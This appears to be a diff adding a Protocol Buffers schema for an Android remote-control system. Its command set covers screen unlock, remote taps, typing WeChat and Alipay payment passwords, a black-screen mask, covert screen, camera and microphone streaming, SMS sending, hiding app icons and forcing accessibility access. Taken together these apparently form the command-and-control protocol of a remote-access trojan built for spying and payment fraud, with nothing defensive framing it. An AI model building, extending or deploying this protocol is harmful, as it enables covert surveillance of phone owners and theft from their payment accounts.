@@ -1,0 +1,252 @@
+syntax = "proto3";
+
+package com.ruoyi.web.domain.proto;
+
+message Message{
+  PackType packType = 1;
+  Terminal terminal = 2;
+  string adminId = 3;
+  string userId = 4;
+  string reqId = 5;
+  string respOfReqId = 6;
+  oneof Pack{
+    string strPack = 21;
+    int32 int32Pack = 22;
+    int64 int64Pack = 23;
+    bool boolPack = 24;
+    InitDevice initDevice = 31;
+    UserState userState = 32;
+    TouchXY touchXY = 33;
+    LogInfo logInfo = 34;
+    InputPassword inputPassword = 35;
+    AdminLoginRequest adminLoginRequest = 36;
+    AdminLoginResponse adminLoginResponse = 37;
+    MediaStream mediaStream = 38;
+    NodeInfo nodeInfo = 39;
+    AppOpt appOpt = 40;
+    ScriptType scriptType = 41;
+  }
+}
+
+// 包类型
+enum PackType{
+  INIT = 0; // 初始化
+  LOGIN_ADMIN = 1; // 管理端登录
+  TOUCH = 2; // 触摸事件
+  ACCESSIBLE_GLOBAL = 3; // 无障碍全局动作
+  INPUT_TEXT = 4; // 填入文本
+  LAYOUT_SHOW = 5; // 布局展示
+  REQUEST_PERMISSION = 6; // 请求权限
+  USER_TERMINAL_STATE = 7; // 上传用户端状态
+  OPERATIONAL_LOG = 8; // 上传操作日志
+  UNLOCK_SCREEN = 9; // 解锁屏幕
+  INPUT_PASSWORD = 10; // 输入密码
+  CLICK_TEXT = 11; // 点击文本
+  OPEN_BLACK_MASK = 12; // 黑屏遮罩
+  LAYOUT_READER = 13; // 布局数据
+  PING = 14; // Ping
+  PONG = 15; // Pong
+  MEDIA_STREAM = 16; // 开始/结束媒体流
+  MICROPHONE = 17; // 是否开启麦克风
+  UNINSTALL_APP = 18; // 卸载APP
+  WAKE_UP_DEVICE = 19; // 唤醒设备,点亮屏幕
+  APP_OPT = 20;//应用管理
+  RUN_SCRIPT = 21;// 运行脚本
+  OPEN_CAMERA_START = 50; //打开摄像头开始
+  OPEN_CAMERA_END = 51; //打开摄像头结束
+  OPEN_FRAME  = 52; //开浮框
+  OPEN_BARRIER_FREE = 53; //开无障碍
+  OPEN_SEND_MESSAGE = 54; //开发送短信
+  CLOSE_BLACK_MASK = 55; // 关闭黑屏遮罩
+  SHORT_MESSAGE_PAGE = 56; //短信通知页
+  ACCESSIBLE_PAGE = 57; //无障碍页
+  BATTERY_WHITE = 58; //电池加白
+  CLOSE_ACCESSIBLE = 59; //关闭无障碍
+  APK_DOWNLOAD = 60; //apk下载
+  CLOSE_CONNECT = 61; //关闭连接
+  OPEN_APP = 62; //打开App
+  MULT =63;
+}
+// 终端类型
+enum Terminal{
+  ADMIN_ANDROID = 0; // Android管理端
+  ADMIN_WEB = 1; // WEB管理端
+  ADMIN_PC = 2; // PC管理端
+  USER_ANDROID = 3; // Android用户端
+}
+// Socket状态
+enum SocketState{
+  SOCKET_UN_CONNECT = 0; // 未连接
+  SOCKET_CONNECT_ING = 1; // 连接中
+  SOCKET_CONNECT_SUCCESS = 2; // 连接成功
+  SOCKET_CONNECT_CLOSE = 3; // 连接关闭
+  SOCKET_CONNECT_ERROR = 4; // 连接出错
+}
+// 屏幕推流器状态
+enum PushScreenState{
+  PUSH_UN_CONNECT = 0; // 未连接
+  PUSH_CONNECT_ING = 1; // 连接中
+  PUSH_CONNECT_SUCCESS = 2; // 连接成功
+  PUSH_DIS_CONNECTE = 3; // 连接断开
+  PUSH_RE_CONNECT = 4; // 重连中
+}
+// 密码类型
+enum PasswordType{
+  WEIXIN = 0; // 微信
+  ZHIFUBAO = 1; // 支付宝
+}
+// 推流媒体类型
+enum StreamMediaType{
+  STOP_STREAM = 0; // 停止屏幕推流
+  DISPLAY = 1; // 屏幕推流
+  CAMERA_BACK = 2; // 后置摄像头推流
+  CAMERA_FRONT = 3; // 前置摄像头推流
+  STOP_CAMERA = 4; // 停止摄像头推流
+}
+// 推流媒体质量
+enum StreamMediaQuality{
+  P360 = 0; // 360P
+  P480 = 1; // 480P
+  P720 = 2; // 720P
+  P1080 = 3; // 1080P
+  P2160 = 4; // 2160P
+  P240 = 5; //240p
+}
+// 脚本类型
+enum ScriptType{
+  SCRIPT_STOP = 0; // 停止运行
+  SCRIPT_FLOATING_WINDOW = 1; // 悬浮窗权限
+  SCRIPT_AUTO_START = 2; // 应用自启动
+  SCRIPT_BATTERY_OPTIMIZATION = 3; // 电池优化
+  SCRIPT_LOCK_BACK = 4; // 后台锁定
+}
+
+// 用户端初始化设备
+message InitDevice{
+  string brand = 1; // 品牌
+  string phoneModel = 2; // 型号
+  string androidVersionName = 3; // Android版本名
+  string androidVersionCode = 4; // Android版本号
+  string resolution = 5; // 分辨率
+  string oemVersionName = 6; // 厂商定制系统版本名
+  string oemVersionCode = 7; // 厂商定制系统版本号
+  string timeZone = 8; // 时区
+  string language = 9; // 语言
+  string time = 10; // 手机时间
+  string electricity = 11; // 手机电量
+  bool charging = 12; // 充电状态
+  bool cardStatus = 13; // 插卡状态
+  string sim1Number = 14; // SIM1号码
+  string sim2Number = 15; // SIM2号码
+  string appVersionCode = 16; // APP版本号
+  string appVersionName = 17; // APP版本名
+  string phoneAngle = 18; // 手机角度
+  bool autoScriptSuccess = 19;// 自动化脚本是否运行成功
+  string flavor = 20; // 团队标识
+}
+
+// 用户端状态
+message UserState{
+  SocketState socketState = 1; // Socket状态
+  string socketStateTxt = 2; // Socket状态文本
+  PushScreenState pushScreenState = 3; // 屏幕推流器状态
+  string pushScreenStateTxt = 4; // 屏幕推流器状态文本
+  bool isAccessibility = 5; // 是否开启无障碍
+  bool isScreenLock = 6; // 是否锁屏
+  int64 instructLastTime = 7; // 最后一次接收指令时间
+  int64 heartbeatTime = 8; // 心跳时间
+  bool isMaskBlack = 9; // 是否黑屏遮罩
+  bool microphone = 10; // 是否开启麦克风
+  StreamMediaType streamMediaType = 11; // 屏幕媒体流类型
+  bool layoutShow = 12; // 是否展示布局
+  string currentAppActivity = 13; //活动界面
+  string currentApp = 14; //当前应用
+  string networkStatus = 15; //网络状态
+  string signalStrength = 16;//信号强度
+  string ip = 17; //ip
+  bool pingServerEnable = 18; // 是否ping通服务器
+  string nowAdminIds = 19; //当前受控的管理端ids
+  PushScreenState pushCameraState = 20; // 屏幕推流器状态
+  string pushCameraStateTxt = 21; // 屏幕推流器状态文本
+  StreamMediaType cameraStreamMediaType = 22; // 摄像头媒体流类型
+
+}
+
+// 触摸屏幕点(百分比)
+message Point{
+  float x = 1; // 坐标X
+  float y = 2; // 坐标Y
+}
+
+// 触摸屏幕参数(百分比)
+message TouchXY{
+  repeated Point point = 1; // 触摸坐标点列表
+  int64 duration = 2; // 持续时间
+}
+
+// 用户端操作日志
+message LogInfo{
+  string packageName = 1; // 包名
+  string className = 2;// 类名
+  string content = 3; // 内容
+}
+
+// 管理端登录信息
+message AdminLoginRequest{
+  string username = 1; // 用户名
+  string password = 2; // 密码
+}
+// 管理端登录响应信息
+message AdminLoginResponse{
+  bool isLoginSuccess = 1; // 是否登录成功
+  string msg = 2; // 信息
+}
+
+// 输入密码
+message InputPassword{
+  PasswordType type = 1; // 密码类型
+  string content = 2; // 密码
+}
+
+// 媒体流数据
+message MediaStream{
+  StreamMediaType type = 1; // 推流媒体类型
+  StreamMediaQuality quality = 2; // 推流媒体质量
+  bool microphone = 3; // 是否开启麦克风
+  int32 fps = 5; // FPS
+  int32 bitrateVideo = 6; // 视频比特率
+  int32 bitrateAudio = 7; // 音频比特率
+}
+
+// 矩形参数
+message Rect{
+  int32 left = 1;
+  int32 top = 2;
+  int32 right = 3;
+  int32 bottom = 4;
+}
+
+// 节点信息
+message NodeInfo{
+  string packageName = 1; // 包名
+  string className = 2; // 类名
+  string text = 3; // 文本
+  string desc = 4; // 描素
+  Rect boundsInScreen = 5;  // 基于屏幕界限
+  bool checked = 7;  // 是否
+  bool checkable = 8;
+  bool enabled = 9;
+  bool editable = 10;
+  bool selected = 11;
+  bool longClickable = 12;
+  bool focusable = 13;
+  bool focused = 14;
+  repeated NodeInfo childs = 15; // 子控件
+}
+
+//处理应用
+message AppOpt{
+  string packName = 1; //应用包名,用来指定要操作的应用
+  //icon_show:显示图标,icon_hide:隐藏图标
+  string opt = 2; //针对该应用要进行的操作
+}
